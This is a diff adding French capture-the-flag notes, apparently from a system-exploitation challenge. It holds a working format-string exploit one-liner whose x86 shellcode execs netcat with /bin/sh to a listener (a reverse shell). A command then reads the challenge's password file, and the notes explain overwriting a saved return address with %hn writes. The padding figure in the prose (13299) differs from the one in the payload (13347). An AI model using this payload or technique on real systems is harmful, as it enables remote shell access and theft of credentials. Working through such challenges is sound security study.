@@ -1,0 +1,20 @@
+(sleep 1 ; (python -c "print '\xfe\xf3\xff\xbf\xfc\xf3\xff\xbf' + '\xeb\x3c\x5e\x31\xc0\x88\x46\x0b\x88\x46\x0e\x88\x46\x16\x88\x46\x26\x88\x46\x2b\x89\x76\x2c\x8d\x5e\x0c\x89\x5e\x30\x8d\x5e\x0f\x89\x5e\x34\x8d\x5e\x17\x89\x5e\x38\x8d\x5e\x27\x89\x5e\x3c\x89\x46\x40\xb0\x0b\x89\xf3\x8d\x4e\x2c\x8d\x56\x40\xcd\x80\xe8\xbf\xff\xff\xff\x2f\x62\x69\x6e\x2f\x6e\x65\x74\x63\x61\x74\x23\x2d\x65\x23\x2f\x62\x69\x6e\x2f\x73\x68\x23\x31\x32\x37\x2e\x31\x32\x37\x2e\x31\x32\x37\x2e\x31\x32\x37\x23\x39\x39\x39\x38' + '\%49031x\%5\$hn' + '\%13347x\%6\$hn'" | nc localhost 56032)) & nc -lvp 9998
+cat /challenge/app-systeme/ch32/.passwd
+
+Notre input est passe directement a snprintf, sans validation, ce qui nous permet d'utiliser des formateurs pour examiner et modifier la memoire.
+En l'occurence, nous allons ecraser une adresse dans la stack qui est cense etre une sauvegarde d'eip.
+Dans gdb nous en trouvons une a 0xbffff3cc (ret de snprintf), nous voulons donc y mettre une adresse vers le debut de shellcode (reserve bind shell)
+Pour ce faire, nous utilisons %n, qui nous permet d'ecrire le nombre de caracteres deja mis dans l'output de snprintf a l'adresse courante. La variante %hn nous permet d'ecrire ceci sur 2 octets seulement, nous permettant d'ecrire une adresse valide en deux temps.
+Le debut de notre input est a 0xbffff3ec, notre shellcode est donc a 0xbffff3ec + 8 (on met les deux adresses ou on veut ecrire avec %hn au debut de notre input), donc 0xbffff3f4.
+
+f3f4 = 62452
+bfff = 49151
+
+4 + 4 + 110 = 118 (shellcode + deux adresses)
+49151 - 118 = 49033 - 2 = 49031
+62452 - 49151 = 13301 - 2 = 13299
+
+Il nous faut donc mettre nos deux adresses, notre shellcode, puis 49031 caracteres, puis ecrire a l'adresse voulue avec %hn, puis encore 13299 caracteres, en finalement le reste de notre adresse avec %hn a nouveau.
+
+
+trouver l'offset gdb/real (script python), lancer 'nc -lvp 9998' dans un shell, puis lancer find_offset.py
